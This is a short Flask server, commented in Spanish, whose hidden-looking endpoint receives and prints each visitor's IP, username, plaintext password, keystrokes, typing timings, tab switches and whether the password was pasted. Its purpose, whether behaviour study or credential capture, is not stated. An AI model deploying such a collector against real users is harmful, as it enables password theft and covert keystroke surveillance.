from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/_api_/', methods=['POST'])
def log_behavior():
    data = request.get_json()
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    print("\\n>> Comportamiento del usuario detectado:")
    print(f"IP: {user_ip}")
    print(f"Usuario (u): {data.get('u')}")
    print(f"Clave (p): {data.get('p')}")
    print(f"Teclas (k): {data.get('k')}")
    print(f"Tiempo total (t): {data.get('t')} ms")
    print(f"Backspaces (b): {data.get('b')}")
    print(f"Cambios de pestaña (c): {data.get('c')}")
    print(f"Pegó clave (g): {'Sí' if data.get('g') else 'No'}")
    print(f"Tiempos entre teclas (d): {data.get('d')}\\n")
    print(f"-------------------------------------------------------------')\n\n")

    return '', 204

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5050)